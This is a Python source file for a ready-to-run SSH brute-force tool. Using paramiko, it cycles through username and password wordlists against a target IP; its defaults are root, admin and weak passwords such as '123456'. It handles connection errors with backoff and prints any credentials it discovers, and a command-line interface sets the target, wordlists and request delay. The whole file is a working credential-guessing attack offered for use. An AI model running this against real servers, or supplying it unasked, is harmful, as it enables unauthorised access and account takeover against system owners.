
import paramiko
import time
import argparse
import logging
import signal
import sys

from paramiko.ssh_exception import AuthenticationException, BadHostKeyException, SSHException, NoValidConnectionsError

logging.basicConfig()
logger = logging.getLogger(__name__)
logger.setLevel(logging.ERROR)

logging.getLogger("paramiko").setLevel(logging.CRITICAL)


class Engine(object):
    user_path = None
    pass_path = None
    target = ''
    userlist = ['root', 'admin', 'ubuntu', 'Administrator']
    passlist = ['password', '123456', 'letmein', 'superman', 'password123']
    credentials = []

    req_time = 0.0
    num_pools = 10

    start_time = 0.0
    interval_start = 0.0
    end_time = 0.0

    verbose = False

    def __init__(self, target, userfile=None, req_time=0.0, passfile=None, verbose=False):
        """
        Initialize ssh brute force engine
        :param target: should be an IP address (string)
        :param userfile: string file path to the file with usernames -- one username per line
        :param req_time: time (in seconds) to wait between requests
        :param passfile: string file path to the file with passwords -- one password per line
        :return:
        """
        self.req_time = req_time
        self.target = target
        self.user_path = userfile
        self.pass_path = passfile
        self.verbose = verbose
        if self.user_path:
            self.userlist = self.load_file(userfile)
        if self.pass_path:
            self.passlist = self.load_file(passfile)

        signal.signal(signal.SIGINT, self.signal_handler)

    def load_file(self, filepath):
        """
        Helper function that loads a filepath and reads the contents.
        :param filepath: string filepath
        :return: a list of each line as an item in the list
        """
        data = []
        with open(filepath, 'r') as f:
            data = f.read().splitlines()
        return data

    def init_ssh(self):
        """
        Initialization of Paramiko ssh object
        :return: paramiko ssh object
        """
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        return ssh

    def execute(self):

        self.start_time = time.time()
        self.interval_start = time.time()

        ssh = self.init_ssh()
        successful = False
        max_conn_attempts = 5
        curr_conn_attempts = 0
        wait_backoff = 1

        count = 0
        search_space = len(self.userlist)*len(self.passlist)

        print('Executing. Total search space: %s' % search_space)

        for user in self.userlist:
            for pw in self.passlist:
                while not successful:
                    try:
                        count += 1
                        curr_conn_attempts += 1
                        ssh.connect(self.target, username=user, password=pw)
                    except BadHostKeyException:
                        raise
                    except AuthenticationException:
                        logger.info('Failed: %s:%s' % (user, pw))
                        if count % 1000 == 0:
                            int_time = time.time() - self.interval_start
                            count_per_min = 1000.00/(int_time/60)
                            params = (user, pw, count, search_space, time.time()-self.start_time, count_per_min)
                            print('Failed: %s:%s. Attempted %s of %s. Elapsed Time: %s s (%s per min)' % params)
                            self.interval_start = time.time()
                        elif self.verbose:
                            print('Failed: %s:%s' % (user, pw))
                        successful = True
                    except SSHException:
                        ssh.close()
                        ssh = self.init_ssh()
                        time.sleep(wait_backoff)
                        wait_backoff += 1
                        count -= 1
                        if curr_conn_attempts >= max_conn_attempts:
                            logger.info('Could not connect to target: %s' % self.target)
                            print('Could not connect to target: %s' % self.target)
                            return
                    except NoValidConnectionsError:
                        logger.error('Could not connect to target (%s)' % self.target)
                        return
                    else:
                        creds = '%s:%s' % (user, pw)
                        logger.info('Discovered Credentials: %s' % creds)
                        print('Discovered Credentials: %s' % creds)
                        self.credentials.append(creds)
                        successful = True

                    time.sleep(self.req_time)

                successful = False
                curr_conn_attempts = 0
                wait_backoff = 1

        self.end_time = time.time()
        total = self.end_time - self.start_time
        logger.debug('\nTotal Execution Time: %s\n' % total)

        print('Discovered credentials: %s' % self.credentials)

    def signal_handler(self, signum, frame):
        print('Caught signal. Exiting.')
        logger.info('\nCaught signal. Exiting.')
        print('Discovered credentials: %s' % self.credentials)
        print('Elapsed Time: %s s' % (time.time()-self.start_time, ))
        sys.exit(0)


def main(ip_addr, userfile=None, req_time=0.0, passfile=None, verbose=False):
    if ip_addr == '' or not ip_addr:
        print('No target IP specified')
        return
    if userfile == '':
        userfile = None
    if passfile == '':
        passfile = None
    engine = Engine(target=ip_addr, userfile=userfile, req_time=req_time, passfile=passfile, verbose=verbose)
    engine.execute()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simple ssh brute-force script')
    parser.add_argument('ip', help='[Required] The IP of the target server')
    parser.add_argument('-u', '--userlist', help='Specify a filepath with a list of usernames to try -- one username per line')
    parser.add_argument('-p', '--passlist', help='Specify a filepath with a list of passwords to try -- one password per line')
    parser.add_argument('-t', '--time', help='Set the time between requests (in seconds)')
    parser.add_argument('-v', '--verbose', action='count', help='Set the output to be more verbose')

    ip_addr = None
    user_filename = None
    pass_filename = None
    req_time = 0.0
    verbose = False
    args = parser.parse_args()

    if args.ip:
        ip_addr = args.ip
    if args.userlist:
        user_filename = args.userlist
    if args.passlist:
        pass_filename = args.passlist
    if args.time:
        req_time = float(args.time)
    if args.verbose and args.verbose > 0:
        verbose = True
    main(ip_addr, user_filename, req_time, pass_filename, verbose)
